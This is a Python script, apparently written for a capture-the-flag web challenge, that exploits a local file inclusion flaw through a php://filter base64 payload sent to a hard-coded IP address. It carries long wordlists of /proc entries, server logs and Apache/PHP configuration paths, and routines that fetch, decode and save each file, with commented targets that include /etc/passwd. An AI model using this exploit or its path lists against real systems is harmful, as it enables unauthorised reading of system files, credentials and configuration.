import requests as req
import base64
import os

ll = [
    "/proc/cmdline",
    "/proc/mounts",
    "/proc/net/arp",
    "/proc/net/fib_trie",
    "/proc/net/route",
    "/proc/net/tcp",
    "/proc/net/udp",
    "/proc/sched_debug",
    "/proc/self/fd/26",
    "/proc/self/cmdline",
    "/proc/self/cwd",
    "/proc/self/environ",
    "/proc/self/fd/0",
    "/proc/self/fd/1",
    "/proc/self/fd/10",
    "/proc/self/fd/11",
    "/proc/self/fd/12",
    "/proc/self/fd/13",
    "/proc/self/fd/14",
    "/proc/self/fd/15",
    "/proc/self/fd/16",
    "/proc/self/fd/17",
    "/proc/self/fd/18",
    "/proc/self/fd/19",
    "/proc/self/fd/2",
    "/proc/self/fd/20",
    "/proc/self/fd/21",
    "/proc/self/fd/22",
    "/proc/self/fd/23",
    "/proc/self/fd/24",
    "/proc/self/fd/25",
    "/proc/self/fd/27",
    "/proc/self/fd/28",
    "/proc/self/fd/29",
    "/proc/self/fd/3",
    "/proc/self/fd/30",
    "/proc/self/fd/31",
    "/proc/self/fd/32",
    "/proc/self/fd/33",
    "/proc/self/fd/34",
    "/proc/self/fd/35",
    "/proc/self/fd/4",
    "/proc/self/fd/5",
    "/proc/self/fd/6",
    "/proc/self/fd/7",
    "/proc/self/fd/8",
    "/proc/self/fd/9",
    "/proc/self/stat",
    "/proc/self/status",
    "/proc/verison",
    "/proc/version",
]

llog = [
    "/apache/logs/access.log",
    "/apache/logs/error.log",
    "/apache2/logs/access.log",
    "/apache2/logs/error.log",
    "/etc/httpd/logs/acces.log",
    "/etc/httpd/logs/acces_log",
    "/etc/httpd/logs/access.log",
    "/etc/httpd/logs/access_log",
    "/etc/httpd/logs/error.log",
    "/etc/httpd/logs/error_log",
    "/logs/access.log",
    "/logs/access_log",
    "/logs/error.log",
    "/logs/error_log",
    "/logs/pure-ftpd.log",
    "/usr/local/apache/log",
    "/usr/local/apache/logs",
    "/usr/local/apache/logs/access.log",
    "/usr/local/apache/logs/access_log",
    "/usr/local/apache/logs/error.log",
    "/usr/local/apache/logs/error_log",
    "/usr/local/apache2/logs/access.log",
    "/usr/local/apache2/logs/access_log",
    "/usr/local/apache2/logs/error.log",
    "/usr/local/apache2/logs/error_log",
    "/usr/local/cpanel/logs",
    "/usr/local/cpanel/logs/access_log",
    "/usr/local/cpanel/logs/error_log",
    "/usr/local/cpanel/logs/license_log",
    "/usr/local/cpanel/logs/login_log",
    "/usr/local/cpanel/logs/stats_log",
    "/usr/local/etc/httpd/logs/access_log",
    "/usr/local/etc/httpd/logs/error_log",
    "/usr/local/www/logs/thttpd_log",
    "/var/adm/log/xferlog",
    "/var/apache/logs/access_log",
    "/var/apache/logs/error_log",
    "/var/cpanel/cpanel.config",
    "/var/log/access.log",
    "/var/log/access_log",
    "/var/log/apache-ssl/access.log",
    "/var/log/apache-ssl/error.log",
    "/var/log/apache/access.log",
    "/var/log/apache/access_log",
    "/var/log/apache/error.log",
    "/var/log/apache/error_log",
    "/var/log/apache2/access.log",
    "/var/log/apache2/access_log",
    "/var/log/apache2/error.log",
    "/var/log/apache2/error_log",
    "/var/log/error.log",
    "/var/log/error_log",
    "/var/log/exim/mainlog",
    "/var/log/exim/paniclog",
    "/var/log/exim/rejectlog",
    "/var/log/exim_mainlog",
    "/var/log/exim_paniclog",
    "/var/log/exim_rejectlog",
    "/var/log/ftp-proxy",
    "/var/log/ftp-proxy/ftp-proxy.log",
    "/var/log/ftplog/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "/var/log/httpsd/ssl.access_log",
    "/var/log/httpsd/ssl_log",
    "/var/log/maillog",
    "/var/log/mysql.log",
    "/var/log/mysql/mysql-bin.log",
    "/var/log/mysql/mysql-slow.log",
    "/var/log/mysql/mysql.log",
    "/var/log/mysqlderror.log",
    "/var/log/proftpd/var/www/logs/access.log",
    "/var/log/pure-ftpd/pure-ftpd.log",
    "/var/log/pureftpd.log",
    "/var/log/thttpd_log",
    "/var/log/vsftpd.log",
    "/var/log/xferlog",
    "/var/mysql.log",
    "/var/www/log/access_log",
    "/var/www/log/error_log",
    "/var/www/logs/access_log",
    "/var/www/logs/error.log",
    "/var/www/logs/error_log",
    "/var/www/mgr/logs/access.log",
    "/var/www/mgr/logs/access_log",
    "/var/www/mgr/logs/error.log",
    "/var/www/mgr/logs/error_log",
    "/www/logs/proftpd.system.log"
]

llp = [
    "/apache/php/php.ini",
    "/bin/php.ini",
    "/etc/apache/conf/httpd.conf",
    "/etc/apache2/apache2.conf",
    "/etc/apache2/conf/httpd.conf",
    "/etc/apache2/httpd.conf",
    "/etc/http/conf/httpd.conf",
    "/etc/http/httpd.conf",
    "/etc/httpd.conf",
    "/etc/httpd/conf/httpd.conf",
    "/etc/httpd/httpd.conf",
    "/etc/httpd/php.ini",
    "/etc/issue",
    "/etc/php.ini",
    "/etc/php/apache/php.ini",
    "/etc/php/apache2/php.ini",
    "/etc/php/cgi/php.ini",
    "/etc/php/php.ini",
    "/etc/php5/apache/php.ini",
    "/etc/php5/apache2/php.ini",
    "/etc/php5/cgi/php.ini",
    "/opt/apache/conf/httpd.conf",
    "/opt/apache2/conf/httpd.conf",
    "/opt/xampp/etc/php.ini",
    "/php/php.ini",
    "/php5/php.ini",
    "/usr/apache/conf/httpd.conf",
    "/usr/apache2/conf/httpd.conf",
    "/usr/lib/php.ini",
    "/usr/lib/php/php.ini",
    "/usr/local/Zend/etc/php.ini",
    "/usr/local/apache/conf/httpd.conf",
    "/usr/local/apache/conf/php.ini",
    "/usr/local/apache/httpd.conf",
    "/usr/local/apache2/conf/httpd.conf",
    "/usr/local/apache2/httpd.conf",
    "/usr/local/apps/apache/conf/httpd.conf",
    "/usr/local/apps/apache2/conf/httpd.conf",
    "/usr/local/etc/apache/conf/httpd.conf",
    "/usr/local/etc/apache/vhosts.conf",
    "/usr/local/etc/apache2/conf/httpd.conf",
    "/usr/local/etc/httpd/conf/httpd.conf",
    "/usr/local/etc/php.ini",
    "/usr/local/httpd/conf/httpd.conf",
    "/usr/local/lib/php.ini",
    "/usr/local/php/httpd.conf",
    "/usr/local/php/httpd.conf.php",
    "/usr/local/php/lib/php.ini",
    "/usr/local/php5/httpd.conf",
    "/usr/local/php5/httpd.conf.php",
    "/usr/local/php5/lib/php.ini",
    "/var/local/www/conf/php.ini",
    "/var/www/conf/httpd.conf",
    "/web/conf/php.ini"
]


def get_source(pl):
    res = req.get(
        url="http://116.62.71.206:52872/?f=php://filter/convert.base64-encode/resource=%s" % pl)
    if res.status_code == 200:
        h = res.content
        return h[31:-12]
    else:
        print("error")
        return False


def fuzz():
    for pl in ll:
        res = get_source(pl)
        if res:
            with open("./fuzz_web3/%s" % os.path.basename(pl), 'w') as f:
                res = base64.b64decode(res)
                f.write(res)


def save(filename, data):
    with open("./fuzz_web3/%s" % os.path.basename(filename), 'wb') as f:
        # res = base64.b64decode(res)
        f.write(data)


def fuzz2():
    for pl in llp:
        res = get_source(pl)
        if res:
            print(pl)
            print(base64.b64decode(res))


if __name__ == '__main__':
    # print("emmmmm")
    # fuzz2()
    # pl = '/etc/passwd'
    # pl = '/proc/self/cmdline'
    # pl = '/etc/init.d/apache2'
    # pl = '/etc/php/5.6/apache2/php.ini'
    # pl = '/usr/lib/php/20131226/encrypt_php.so'
    # pl = '/var/www/html/upload_sctf2018_C9f7y48M75.php'
    pl = '/etc/apache2/apache2.conf'
    # pl = '/etc/apache2/httpd.conf'
    # pl = '/etc/apache2/envvars'
    # pl = '/var/log/apache2/access.log'
    # pl = '/var/log/apache2/error.log'
    # pl = '/etc/apache2/sites-enabled/000-default.conf'
    # pl = '/etc/apache2/conf-enabled/httpd.conf'
    # # pl = '/var/www/index.php'
    # pl = '/var/www/html/.htaccess'
    # pl = '/etc/php/5.6/apache2/php.ini'
    res = get_source(pl)
    if res:
        res = base64.b64decode(res)
        # print(len(res))
        # save(pl, res)
        print(res)
